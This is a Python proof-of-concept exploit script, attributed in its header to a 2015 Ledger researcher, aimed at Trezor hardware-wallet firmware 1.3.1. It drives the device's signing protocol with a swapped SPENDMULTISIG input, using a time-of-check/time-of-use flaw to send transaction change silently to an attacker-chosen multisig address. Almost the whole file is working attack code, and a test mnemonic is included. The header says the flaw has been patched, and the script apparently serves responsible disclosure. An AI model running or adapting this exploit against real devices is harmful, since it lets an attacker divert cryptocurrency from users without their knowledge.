# Trezor 1.3.1 SPENDMULTISIG TOCTOU
# MIT license
# Nicolas Bacca, Ledger, 2015

# TOCTOU and specific change rules allow to transparently redirect change to an address 
# chosen by the attacker without notifying the user for any transaction
# PoC TXs : bca17fb40c8c86e7c7acd0d3749af9e5c66575dce86db895b7e3301f7a4b2b84 -> b3c2b4a8e98d4494e9f303754a4e9477c1f6e1c1b7c4210bf53a4b2156bfbb99
# PoC Setup :
# client.load_device_by_mnemonic(mnemonic='alcohol woman abuse must during monitor noble actual mixed trade anger aisle', pin='', passphrase_protection=False, label='test', language='english')

# Cleared by https://github.com/trezor/trezor-mcu/commit/137a60ce017c402ac160258bcc4b5f7b5aba0560

from trezorlib import *
from trezorlib.client import TrezorClient
from trezorlib.transport_hid import HidTransport
import trezorlib.messages_pb2 as proto
import trezorlib.types_pb2 as types
import binascii

devices = HidTransport.enumerate()
client = TrezorClient(HidTransport(devices[0]))

client.transport.session_begin()
tx = proto.SignTx()
tx.inputs_count = 1
tx.outputs_count = 2
tx.coin_name = "Bitcoin"
res = client.call(tx)

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

dummyhdnode = types.HDNodeType(
	depth=0, 
	fingerprint=0,
	child_num=0,
	chain_code=binascii.unhexlify('2fb77e25cd3e2e034bcbafa1f81ec7e4caf927b06c87db296f1186208315525e'),
	public_key=binascii.unhexlify('03f645ec6544a92f951f3bca16a2bc1c56846d065594db222725d59b9902528385')
)
dummyhdnodepath = types.HDNodePathType(
	node=dummyhdnode,
	address_n=[0x0000004c, 0x00000033, 0x0000001E, 0x00000002]
)

dummyMultisig = types.MultisigRedeemScriptType(
	pubkeys=[dummyhdnodepath],
	m=1)

msg = types.TransactionType()
testInput = types.TxInputType(
	address_n=[0x8000004c, 0x80000033, 0x8000001E, 0x00000001],
	prev_hash=binascii.unhexlify('bca17fb40c8c86e7c7acd0d3749af9e5c66575dce86db895b7e3301f7a4b2b84'),
	prev_index=1,
	script_sig=binascii.unhexlify('76a91440afc69e46643de1908c8988ad62214270006c3b88ac'),
	script_type=types.SPENDMULTISIG,
	multisig=dummyMultisig
)
msg.inputs.extend([ testInput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

msg = types.TransactionType()
msg.version = 1
msg.lock_time = 0
msg.inputs_cnt = 1
msg.outputs_cnt = 2

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

msg = types.TransactionType()
testInput = types.TxInputType(
	address_n=[],
	prev_hash=binascii.unhexlify('2e6320c02480d0633507b18f45a28813e12faa429ed6bf79f50280a14ae99a8f'),
	prev_index=1,
	script_sig=binascii.unhexlify('483045022100a3c7a1894f385b86cd2ea2cd2dff40220492a8edbc717ccdb60f8b2e2f54c09d022019bfe67bfb49c30b78b01afa05ca62f264dee6c7e4030736d6da31e387407ce70121025b77b0878978629c12a13d178fdd188c75130f08c799bad9b7ab3db9db60155a'),	
)
msg.inputs.extend([ testInput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testOutput = types.TxOutputBinType(	
	amount=490000,
	script_pubkey=binascii.unhexlify('76a914847bb7935e233ca4d0f4244213558cf2786ad15388ac')
)
msg.bin_outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testOutput = types.TxOutputBinType(
	amount=500000,
	script_pubkey=binascii.unhexlify('76a91440afc69e46643de1908c8988ad62214270006c3b88ac')
)
msg.bin_outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testOutput = types.TxOutputType(
	amount=500000 / 5 - 10000,
	script_type=types.PAYTOMULTISIG,
	multisig=dummyMultisig
)
msg.outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testOutput = types.TxOutputType(
	address='1MmzKAdnH3b2YcRBA9zL5TN5cHd3t1sxVe',
	amount=500000 * 4 / 5,
	script_type=types.PAYTOADDRESS,
)
msg.outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testInput = types.TxInputType(
	address_n=[0x8000004c, 0x80000033, 0x8000001E, 0x00000001],
	prev_hash=binascii.unhexlify('bca17fb40c8c86e7c7acd0d3749af9e5c66575dce86db895b7e3301f7a4b2b84'),
	prev_index=1,
	script_sig=binascii.unhexlify('76a91440afc69e46643de1908c8988ad62214270006c3b88ac'),
	#script_type=types.SPENDMULTISIG,
	#multisig=dummyMultisig
)
msg.inputs.extend([ testInput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

msg = types.TransactionType()
testOutput = types.TxOutputType(
	amount=500000 / 5 - 10000,
	script_type=types.PAYTOMULTISIG,
	multisig=dummyMultisig
)
msg.outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testOutput = types.TxOutputType(
	address='1MmzKAdnH3b2YcRBA9zL5TN5cHd3t1sxVe',
	amount=500000 * 4 / 5,
	script_type=types.PAYTOADDRESS,
)
msg.outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testOutput = types.TxOutputType(
	amount=500000 / 5 - 10000,
	script_type=types.PAYTOMULTISIG,
	multisig=dummyMultisig
)
msg.outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res

msg = types.TransactionType()
testOutput = types.TxOutputType(
	address='1MmzKAdnH3b2YcRBA9zL5TN5cHd3t1sxVe',
	amount=500000 * 4 / 5,
	script_type=types.PAYTOADDRESS,
)
msg.outputs.extend([ testOutput ])

res = client.call(proto.TxAck(tx = msg))

if isinstance(res, proto.Failure):
    raise CallException("Signing failed")

if not isinstance(res, proto.TxRequest):
   raise CallException("Unexpected message")

print res
